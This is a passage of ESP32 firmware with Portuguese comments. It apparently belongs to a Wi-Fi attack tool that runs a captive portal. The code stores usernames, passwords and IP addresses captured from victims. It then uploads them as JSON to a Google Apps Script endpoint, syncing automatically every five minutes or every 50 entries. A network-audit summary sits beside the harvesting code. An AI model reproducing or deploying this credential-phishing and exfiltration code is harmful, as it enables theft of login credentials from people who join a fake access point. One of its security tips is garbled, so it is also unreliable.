    return;
  }
  
  int openNetworks = 0;
  int wepNetworks = 0;
  int wpaNetworks = 0;
  int wpa2Networks = 0;
  int wpa3Networks = 0;
  int strongSignals = 0;
  
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].encryption == "ABERTA") openNetworks++;
    else if (networks[i].encryption == "WEP") wepNetworks++;
    else if (networks[i].encryption == "WPA") wpaNetworks++;
    else if (networks[i].encryption == "WPA2" || networks[i].encryption == "WPA/WPA2") wpa2Networks++;
    else if (networks[i].encryption == "WPA3") wpa3Networks++;
    
    if (networks[i].rssi > -50) strongSignals++;
  }
  
  Serial.printf("Total de redes analisadas: %d\n", networkCount);
  Serial.printf("Redes abertas (VULNERÁVEL): %d\n", openNetworks);
  Serial.printf("Redes WEP (VULNERÁVEL): %d\n", wepNetworks);
  Serial.printf("Redes WPA (FRACA): %d\n", wpaNetworks);
  Serial.printf("Redes WPA2 (BOA): %d\n", wpa2Networks);
  Serial.printf("Redes WPA3 (EXCELENTE): %d\n", wpa3Networks);
  Serial.printf("Sinais fortes (>-50dBm): %d\n", strongSignals);
  
  Serial.println("\nRecomendações de segurança:");
  if (openNetworks > 0) {
    Serial.println("- Redes abertas detectadas! Configure senha WPA2/WPA3");
  }
  if (wepNetworks > 0) {
    Serial.println("- Redes WEP detectadas! Atualize para WPA2/WPA3");
  }
  if (wpaNetworks > 0) {
    Serial.println("- Redes WPA detectadas! Atualize para WPA2/WPA3");
  }
  
  Serial.println("- Use senhas fortes (>12 caracteres)");
  Serial.println("- Ative WPS desabilitado");
  Serial.println("- Use WPA3 quando disponível");
  Serial.println("- Considere ocultar SSID para redes sensíveis");
}

void saveCredentialsLocally(String username, String password, String ip) {
  if (credentialCount < 200) {
    capturedCredentials[credentialCount].username = username;
    capturedCredentials[credentialCount].password = password;
    capturedCredentials[credentialCount].ip = ip;
    capturedCredentials[credentialCount].timestamp = millis();
    credentialCount++;
    
    Serial.println("Credenciais salvas localmente. Total: " + String(credentialCount));
    Serial.printf("Uso de memória estimado: %d KB\n", (credentialCount * 100) / 1024);
    
    // Auto-sincronizar a cada 50 credenciais
    if (credentialCount % 50 == 0) {
      Serial.println("Limite de 50 credenciais atingido. Tentando sincronização automática...");
      connectToWiFiAndSync();
    }
  } else {
    Serial.println("Limite de armazenamento atingido!");
    Serial.println("Tentando sincronização automática...");
    connectToWiFiAndSync();
  }
}

void showStoredCredentials() {
  Serial.println("\n=== CREDENCIAIS ARMAZENADAS ===");
  if (credentialCount == 0) {
    Serial.println("Nenhuma credencial armazenada.");
    return;
  }
  
  for (int i = 0; i < credentialCount; i++) {
    Serial.printf("Entrada %d:\n", i + 1);
    Serial.printf("  Username: %s\n", capturedCredentials[i].username.c_str());
    Serial.printf("  Password: %s\n", capturedCredentials[i].password.c_str());
    Serial.printf("  IP: %s\n", capturedCredentials[i].ip.c_str());
    Serial.printf("  Timestamp: %lu\n", capturedCredentials[i].timestamp);
    Serial.println();
  }
}

void configuraWiFi(int modo) {
    WiFiManager wm;
    bool res;
    digitalWrite(LED,LOW);

    if(modo==1) {
      wm.resetSettings();
    }
    
    res = wm.autoConnect("ConfiguraWifiESP32","cyber2025"); // password protected ap

    if(!res) {
        Serial.println("Falha Conexão");
    } 
    else {
        Serial.println("Conectado");
        // Recupera o SSID e senha conectados

        wifiSSID = WiFi.SSID();
        wifiPassword = WiFi.psk();
        Serial.println("SSID: " + wifiSSID);
        Serial.println("Senha: " + wifiPassword); 
    }

}

void connectToWiFiAndSync() {
  if (credentialCount == 0) {
    Serial.println("Nenhuma credencial para sincronizar.");
    return;
  }
  
  Serial.println("Conectando ao WiFi...");
  digitalWrite(LED,LOW);
  WiFi.mode(WIFI_STA);
  WiFi.begin(wifiSSID, wifiPassword);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {

    Serial.println("\nConectado ao WiFi!");
    Serial.println("IP: " + WiFi.localIP().toString());
    
    // Sincronizar dados armazenados
    Serial.println("Sincronizando " + String(credentialCount) + " credenciais com Google Sheets...");
    int successCount = 0;
    
    for (int i = 0; i < credentialCount; i++) {
      Serial.printf("Enviando credencial %d/%d...\n", i+1, credentialCount);
      
      HTTPClient http;
      http.begin(googleScriptURL);
      http.addHeader("Content-Type", "application/json");
      
      DynamicJsonDocument doc(1024);
      doc["username"] = capturedCredentials[i].username;
      doc["password"] = capturedCredentials[i].password;
      doc["ip"] = capturedCredentials[i].ip;
      doc["timestamp"] = capturedCredentials[i].timestamp;
      
      String jsonString;
      serializeJson(doc, jsonString);
      
      int httpResponseCode = http.POST(jsonString);
      
      if (httpResponseCode > 0) {
        successCount++;
        Serial.printf("✓ Credencial %d enviada com sucesso\n", i+1);
      } else {
        Serial.printf("✗ Erro ao enviar credencial %d: %d\n", i+1, httpResponseCode);
      }
      
      http.end();
      delay(1000);
    }
    
    Serial.printf("Sincronização concluída! %d/%d credenciais enviadas.\n", successCount, credentialCount);
    
    // Limpar dados locais após sincronização
    if (successCount == credentialCount) {
      credentialCount = 0;
      Serial.println("Memória RAM liberada com sucesso!");
    } else {
      Serial.println("Algumas credenciais falharam. Mantendo dados na memória.");
    }
    
  } else {
    Serial.println("\nFalha ao conectar ao WiFi!");
    Serial.println("Credenciais mantidas na memória para próxima tentativa.");
  }
  
  // Voltar ao modo AP se estava no portal captivo
  if (currentMode == CAPTIVE_PORTAL_MODE) {
    Serial.println("Retornando ao modo Portal Captivo...");
    delay(2000);
    startCaptivePortalMode();
  }
}

void autoSyncCheck() {
  static unsigned long lastAutoSync = 0;
  const unsigned long autoSyncInterval = 300000; // 5 minutos
  
  // Verifica a cada 5 minutos se há credenciais para sincronizar
  if (millis() - lastAutoSync > autoSyncInterval && credentialCount > 0) {
    Serial.println("Verificação automática: tentando sincronizar dados...");
    connectToWiFiAndSync();
    lastAutoSync = millis();
  }
}

void sendToGoogleSheets(String username, String password, String ip) {
  // Esta função agora é chamada apenas durante a sincronização manual
  Serial.println("Use comando '7' para sincronizar ou aguarde sincronização automática");
}
